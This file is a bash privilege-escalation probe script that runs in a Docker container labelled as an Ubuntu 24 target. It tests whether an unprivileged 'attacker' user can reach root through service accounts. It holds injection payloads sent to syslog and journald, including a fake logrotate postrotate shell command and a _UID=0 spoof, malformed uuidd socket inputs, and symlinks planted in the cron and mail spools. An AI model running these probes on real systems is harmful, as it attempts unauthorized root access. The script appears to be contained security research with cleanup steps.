#!/usr/bin/env bash
set -u -o pipefail

target="${1:-ubuntu24-server-lpe-target}"

docker exec -i "$target" bash -s <<'INNER'
set +e

TAG=agent_service_account_bridges
WORK=/tmp/$TAG
ROOT_MARK=/root/${TAG}_root_proof
ROOT_DECOY=/root/${TAG}_root_decoy
PKGKIT_INITIAL_ACTIVE="$(systemctl is-active packagekit.service 2>/dev/null || true)"
FWUPD_INITIAL_ACTIVE="$(systemctl is-active fwupd.service 2>/dev/null || true)"

section() {
  printf '\n## %s\n' "$1"
}

show_path() {
  for p in "$@"; do
    if [ -e "$p" ] || [ -L "$p" ]; then
      stat -c '%A %a %U:%G %u:%g %F %n -> %N' "$p" 2>&1
    else
      printf 'ABSENT %s\n' "$p"
    fi
  done
}

run_attacker() {
  printf '\n$ attacker$ %s\n' "$*"
  runuser -u attacker -- bash -lc "$*" 2>&1
  printf 'rc=%s\n' "$?"
}

probe_cleanup() {
  rm -rf "$WORK" \
    /tmp/${TAG}.journald \
    /tmp/${TAG}.logrotate.debug \
    /tmp/${TAG}.motd.out \
    /tmp/${TAG}.pkcon.out \
    /tmp/${TAG}.tmpfiles.out \
    /tmp/${TAG}_syslog_sender.py \
    /tmp/${TAG}_uuidd_malformed.py \
    /tmp/${TAG}_utmp.py \
    /tmp/${TAG}_attacker_* \
    /var/tmp/${TAG}* \
    /var/crash/${TAG}* \
    /home/attacker/.landscape/${TAG}* 2>/dev/null || true
  rm -f "$ROOT_MARK" "$ROOT_DECOY" 2>/dev/null || true
  if [ "$PKGKIT_INITIAL_ACTIVE" != "active" ]; then
    systemctl stop packagekit.service >/dev/null 2>&1 || true
  fi
  if [ "$FWUPD_INITIAL_ACTIVE" != "active" ]; then
    systemctl stop fwupd.service >/dev/null 2>&1 || true
  fi
}

probe_cleanup
mkdir -p "$WORK"
printf 'root decoy - should remain unchanged\n' >"$ROOT_DECOY"
chmod 0600 "$ROOT_DECOY"

section "target, attacker, and kernel defaults"
cat /etc/os-release | sed -n '1,8p'
uname -a
id attacker
printf 'attacker groups: '; id -Gn attacker
id selfauth 2>/dev/null || true
for k in fs.protected_hardlinks fs.protected_symlinks fs.protected_regular fs.protected_fifos kernel.dmesg_restrict; do
  sysctl "$k" 2>/dev/null || true
done

section "package proof for service-account bridge candidates"
for pkg in \
  systemd systemd-resolved systemd-timesyncd dbus polkitd \
  rsyslog logrotate cron apport uuid-runtime util-linux libuuid1 \
  apt packagekit unattended-upgrades update-notifier-common landscape-common \
  udisks2 fwupd libutempter0 screen byobu tmux bsd-mailx mailutils postfix
do
  dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' "$pkg" 2>/dev/null || printf '%s\tNOT_INSTALLED\n' "$pkg"
done

section "default users and groups"
getent passwd root attacker syslog uuidd _apt landscape systemd-network systemd-timesync systemd-resolve fwupd polkitd messagebus mail cron 2>/dev/null || true
getent group root attacker adm syslog uuidd mail landscape crontab utmp systemd-journal systemd-network systemd-timesync systemd-resolve fwupd 2>/dev/null || true

section "default unit reachability"
for u in \
  rsyslog.service systemd-journald.service logrotate.timer logrotate.service \
  cron.service uuidd.socket uuidd.service apport-autoreport.service apport-forward.socket \
  systemd-resolved.service systemd-networkd.service systemd-timesyncd.service \
  packagekit.service polkit.service udisks2.service fwupd.service \
  apt-daily.timer apt-daily-upgrade.timer unattended-upgrades.service \
  motd-news.timer motd-news.service update-notifier-download.timer update-notifier-download.service \
  update-notifier-motd.timer update-notifier-motd.service
do
  printf '%-42s enabled=%-12s active=%s\n' "$u" "$(systemctl is-enabled "$u" 2>/dev/null || true)" "$(systemctl is-active "$u" 2>/dev/null || true)"
done

section "live service process credentials"
for name in rsyslogd systemd-journald uuidd cron systemd-resolved systemd-networkd systemd-timesyncd packagekitd polkitd udisksd fwupd; do
  for pid in $(pidof "$name" 2>/dev/null || true); do
    printf '\nPROCESS %s pid=%s\n' "$name" "$pid"
    tr '\0' ' ' </proc/"$pid"/cmdline; printf '\n'
    grep -E '^(Uid|Gid|Groups|CapEff|NoNewPrivs):' /proc/"$pid"/status 2>/dev/null || true
  done
done

section "key bridge path permissions"
show_path \
  /dev/log /run/systemd/journal/dev-log /run/systemd/journal/socket /run/systemd/journal/stdout /run/systemd/journal/syslog \
  /var/log /var/log/syslog /var/log/auth.log /var/log/wtmp /var/log/btmp /var/log/lastlog /var/spool/rsyslog \
  /run/uuidd /run/uuidd/request /var/lib/libuuid /var/lib/libuuid/clock.txt \
  /var/cache/apt /var/cache/apt/archives /var/cache/apt/archives/partial /var/lib/apt/lists /var/lib/apt/lists/partial \
  /var/lib/update-notifier /var/lib/update-notifier/package-data-downloads /var/lib/update-notifier/package-data-downloads/partial \
  /etc/landscape /var/lib/landscape /var/log/landscape \
  /run/systemd/resolve /run/systemd/resolve/resolv.conf /run/systemd/netif /var/lib/systemd/timesync /var/lib/private/systemd/timesync \
  /var/mail /var/spool/mail /var/spool/cron/crontabs /run/utmp \
  /var/lib/fwupd /var/cache/fwupd /var/cache/app-info \
  /usr/bin/crontab /usr/lib/aarch64-linux-gnu/utempter/utempter /usr/bin/screen /usr/bin/wall

section "root consumers and fixed-path config excerpts"
grep -RsnE '(/var/log|/dev/log|/run/systemd/journal|/var/lib/libuuid|uuidd|_apt|/var/cache/apt|package-data-downloads|/etc/landscape|/var/lib/landscape|/run/systemd/resolve|/run/systemd/netif|/var/mail|/var/spool/cron|/run/utmp|wtmp|btmp|lastlog|fwupd)' \
  /etc/logrotate.conf /etc/logrotate.d /etc/cron* /etc/tmpfiles.d /usr/lib/tmpfiles.d /etc/pam.d /etc/update-motd.d \
  /usr/lib/systemd/system 2>/dev/null | sed -n '1,260p'
printf '\n-- selected numbered configs --\n'
for f in /etc/rsyslog.conf /etc/rsyslog.d/50-default.conf /etc/logrotate.d/rsyslog /etc/logrotate.conf /usr/lib/systemd/system/uuidd.service /usr/lib/systemd/system/uuidd.socket /etc/update-motd.d/50-landscape-sysinfo /etc/cron.daily/apport; do
  [ -e "$f" ] || continue
  printf '\n### %s\n' "$f"
  nl -ba "$f" | sed -n '1,180p'
done

section "attacker direct write matrix for service-account state"
run_attacker '
set +e
TAG=agent_service_account_bridges
for d in \
  /var/log /var/spool/rsyslog /run/log /run/log/journal \
  /var/lib/libuuid /var/cache/apt/archives/partial /var/lib/apt/lists/partial \
  /var/lib/update-notifier/package-data-downloads/partial \
  /etc/landscape /var/lib/landscape /var/log/landscape \
  /run/systemd/resolve /run/systemd/netif /var/lib/systemd/timesync /var/lib/private/systemd/timesync \
  /var/mail /var/spool/cron/crontabs /var/lib/fwupd /var/cache/fwupd /var/cache/app-info
do
  [ -e "$d" ] || { echo "DIR_ABSENT $d"; continue; }
  rm -f "$d/${TAG}_touch" 2>/dev/null
  if touch "$d/${TAG}_touch" 2>/tmp/${TAG}_touch.err; then
    stat -c "DIR_WRITE_OK %A %U:%G %n" "$d/${TAG}_touch"
    rm -f "$d/${TAG}_touch"
  else
    echo "DIR_WRITE_DENY $d $(cat /tmp/${TAG}_touch.err)"
  fi
done
for f in \
  /var/log/syslog /var/log/auth.log /var/log/wtmp /var/log/btmp /var/log/lastlog /run/utmp \
  /var/lib/libuuid/clock.txt /run/systemd/resolve/resolv.conf /run/systemd/netif/state
do
  [ -e "$f" ] || { echo "FILE_ABSENT $f"; continue; }
  if sh -c "printf $TAG >> \"$f\"" 2>/tmp/${TAG}_append.err; then
    echo "FILE_APPEND_OK $f"
  else
    echo "FILE_APPEND_DENY $f $(cat /tmp/${TAG}_append.err)"
  fi
done
rm -f /tmp/${TAG}_touch.err /tmp/${TAG}_append.err
'

section "syslog and journald bridge trigger as uid1001"
cat >/tmp/${TAG}_syslog_sender.py <<'PY'
import os, socket
tag = "agent_service_account_bridges"
payloads = [
    f"<13>{tag}-raw: fakehost root[1]: {tag} newline\\npostrotate\\n\\t/bin/sh -c 'id > /root/{tag}_root_proof'\\nendscript",
    f"<10>{tag}-raw: {tag} path=/etc/logrotate.d/rsyslog marker=/root/{tag}_root_proof",
]
for path in ("/dev/log", "/run/systemd/journal/syslog"):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        s.connect(path)
        for payload in payloads:
            s.send(payload.encode("utf-8", "surrogateescape"))
        print(f"sent_syslog path={path}")
    except Exception as exc:
        print(f"send_syslog_error path={path} exc={exc!r}")
PY
run_attacker "logger -p authpriv.warning -t '${TAG}-logger' '${TAG} authpriv fake sudo postrotate id_to_${ROOT_MARK}'"
run_attacker "logger -p user.emerg -t '${TAG}-emerg' '${TAG} emerg broadcast command string /bin/sh -c id_to_${ROOT_MARK}'"
run_attacker "python3 /tmp/${TAG}_syslog_sender.py"
run_attacker "printf 'MESSAGE=${TAG} journald native _UID spoof attempt\n_UID=0\n_SYSTEMD_UNIT=logrotate.service\nCODE_FILE=/etc/logrotate.d/rsyslog\n' | logger --journald"
sleep 1
printf '\n-- captured text log entries --\n'
grep -Rsa "$TAG" /var/log/syslog /var/log/auth.log /var/log/user.log /var/log/mail.log /var/log/kern.log 2>/dev/null | tail -n 80 || true
printf '\n-- captured journal entries --\n'
journalctl --no-pager -o verbose -n 120 2>/dev/null | grep -A12 -B2 "$TAG" | tail -n 180 || true
printf '\n-- root logrotate debug, fixed paths only --\n'
logrotate -d /etc/logrotate.conf >/tmp/${TAG}.logrotate.debug 2>&1
grep -Ea 'reading config file|rotating pattern:|considering log|creating new|running postrotate|rsyslog-rotate|error|agent_service_account_bridges' /tmp/${TAG}.logrotate.debug | sed -n '1,220p'

section "uuidd world socket to uuidd service-account boundary"
run_attacker '/usr/sbin/uuidd --time --uuids 3'
run_attacker '/usr/sbin/uuidd --random --uuids 3'
cat >/tmp/${TAG}_uuidd_malformed.py <<'PY'
import socket
path = "/run/uuidd/request"
for payload in (b"\xff" * 16, b"T" + b"\xff" * 64, b"\x04" + (2**31-1).to_bytes(4, "little", signed=False)):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect(path)
        s.sendall(payload)
        try:
            data = s.recv(64)
            print("uuidd_reply", data.hex())
        except Exception as exc:
            print("uuidd_recv_error", repr(exc))
        s.close()
    except Exception as exc:
        print("uuidd_connect_error", repr(exc))
PY
run_attacker "python3 /tmp/${TAG}_uuidd_malformed.py"
show_path /run/uuidd/request /var/lib/libuuid /var/lib/libuuid/clock.txt
for pid in $(pidof uuidd 2>/dev/null || true); do
  printf 'uuidd_after pid=%s ' "$pid"; grep -E '^(Uid|Gid|Groups|CapEff|NoNewPrivs):' /proc/"$pid"/status | tr '\n' ' '; printf '\n'
done
grep -RsnE 'uuidd|/var/lib/libuuid|clock.txt' /etc /usr/lib/systemd/system /usr/lib/tmpfiles.d 2>/dev/null | sed -n '1,160p'

section "_apt and package-cache bridge checks"
run_attacker "timeout 15 pkcon get-updates > /tmp/${TAG}.pkcon.out 2>&1; printf 'pkcon_get_updates_rc=%s\n' \"\$?\"; sed -n '1,80p' /tmp/${TAG}.pkcon.out"
show_path /var/cache/apt/archives/partial /var/lib/apt/lists/partial /var/lib/update-notifier/package-data-downloads/partial
grep -RsnE '(_apt|partial|package-data-downloads|/var/cache/apt|/var/lib/apt/lists|Script:|SHA256|Checksum)' \
  /etc/apt /usr/lib/update-notifier /usr/share/package-data-downloads /usr/lib/apt /usr/lib/systemd/system/apt* \
  /usr/lib/systemd/system/unattended-upgrades.service 2>/dev/null | sed -n '1,240p'

section "landscape and MOTD bridge checks"
run_attacker "mkdir -p ~/.landscape; printf '[sysinfo]\nload=/tmp/${TAG}_attacker_plugin.py\n' > ~/.landscape/${TAG}_sysinfo.conf; touch ~/.landscape/${TAG}_created; ls -la ~/.landscape"
HOME=/home/attacker run-parts --lsbsysinit /etc/update-motd.d >/tmp/${TAG}.motd.out 2>&1
printf 'root_motd_rc=%s\n' "$?"
sed -n '1,120p' /tmp/${TAG}.motd.out
show_path /etc/landscape /var/lib/landscape /var/lib/landscape/landscape-sysinfo.cache /var/log/landscape /home/attacker/.landscape/${TAG}_sysinfo.conf
grep -RsnE '(getuid|HOME|sysinfo.conf|/etc/landscape|/var/lib/landscape|/var/log/landscape|import|plugins)' \
  /usr/share/landscape /usr/lib/python3/dist-packages/landscape /etc/update-motd.d/50-landscape-sysinfo 2>/dev/null | sed -n '1,220p'

section "resolved, networkd, and timesync service-account bridge checks"
run_attacker 'resolvectl query localhost 2>&1 | sed -n "1,80p"'
run_attacker 'resolvectl status 2>&1 | sed -n "1,120p"'
run_attacker 'busctl --system tree org.freedesktop.resolve1 2>&1 | sed -n "1,80p"'
show_path /run/systemd/resolve /run/systemd/resolve/resolv.conf /run/systemd/netif /run/systemd/netif/state /var/lib/systemd/timesync /var/lib/private/systemd/timesync
grep -RsnE '(/run/systemd/resolve|/run/systemd/netif|/var/lib/systemd/timesync|systemd-resolve|systemd-network|systemd-timesync)' \
  /etc /usr/lib/tmpfiles.d /usr/lib/systemd/system 2>/dev/null | sed -n '1,240p'

section "polkit, packagekit, udisks, fwupd privilege-drop bridge checks"
run_attacker 'timeout 8 busctl --system call org.freedesktop.PolicyKit1 /org/freedesktop/PolicyKit1/Authority org.freedesktop.DBus.Properties Get ss org.freedesktop.PolicyKit1.Authority BackendName 2>&1 || true'
run_attacker 'timeout 8 udisksctl status 2>&1 | sed -n "1,120p"'
run_attacker 'timeout 8 fwupdmgr get-devices 2>&1 | sed -n "1,120p"'
for name in packagekitd polkitd udisksd fwupd; do
  for pid in $(pidof "$name" 2>/dev/null || true); do
    printf 'service_after %s pid=%s ' "$name" "$pid"; grep -E '^(Uid|Gid|Groups|CapEff|NoNewPrivs):' /proc/"$pid"/status | tr '\n' ' '; printf '\n'
  done
done

section "mail, utmp, and crontab helper bridge checks"
run_attacker 'crontab -l 2>&1 | sed -n "1,40p"'
run_attacker 'touch /var/spool/cron/crontabs/agent_service_account_bridges 2>&1; ln -s /root/agent_service_account_bridges_root_proof /var/spool/cron/crontabs/agent_service_account_bridges_link 2>&1'
run_attacker 'touch /var/mail/agent_service_account_bridges 2>&1; ln -s /root/agent_service_account_bridges_root_proof /var/mail/agent_service_account_bridges_link 2>&1'
cat >/tmp/${TAG}_utmp.py <<'PY'
import ctypes, os, pty, subprocess
try:
    master, slave = pty.openpty()
    print("pty", os.ttyname(slave), "uid", os.getuid(), "gid", os.getgid(), "groups", os.getgroups())
    lib = ctypes.CDLL("libutempter.so.0")
    lib.utempter_add_record.argtypes = [ctypes.c_int, ctypes.c_char_p]
    lib.utempter_remove_record.argtypes = [ctypes.c_int]
    lib.utempter_add_record(master, b"agent_service_account_bridges")
    print("who_after_add")
    subprocess.run(["who"], check=False)
    lib.utempter_remove_record(master)
    print("who_after_remove")
    subprocess.run(["who"], check=False)
except Exception as exc:
    print("utmp_probe_error", repr(exc))
PY
run_attacker "python3 /tmp/${TAG}_utmp.py"
show_path /var/mail /var/spool/mail /var/spool/cron/crontabs /run/utmp /var/log/wtmp /var/log/btmp /var/log/lastlog
grep -RsnE '(MAILTO|sendmail|/var/mail|/var/spool/cron|/run/utmp|wtmp|btmp|lastlog|utempter)' \
  /etc/cron* /etc/pam.d /etc/logrotate.d /usr/lib/tmpfiles.d /usr/lib/systemd/system 2>/dev/null | sed -n '1,240p'

section "root marker and health"
if [ -e "$ROOT_MARK" ] || [ -L "$ROOT_MARK" ]; then
  echo "ROOT_PROOF=YES"
  show_path "$ROOT_MARK"
  cat "$ROOT_MARK" 2>&1 || true
else
  echo "ROOT_PROOF=NO"
fi
printf 'root_decoy_sha256='; sha256sum "$ROOT_DECOY" 2>/dev/null || true
systemctl is-system-running || true
systemctl --failed --no-legend | wc -l

section "cleanup"
probe_cleanup
show_path "$WORK" "$ROOT_MARK" "$ROOT_DECOY" /tmp/${TAG}.logrotate.debug /tmp/${TAG}.motd.out /var/crash/${TAG}.crash /var/mail/${TAG} /var/spool/cron/crontabs/${TAG}
systemctl is-system-running || true
systemctl --failed --no-legend | wc -l
INNER
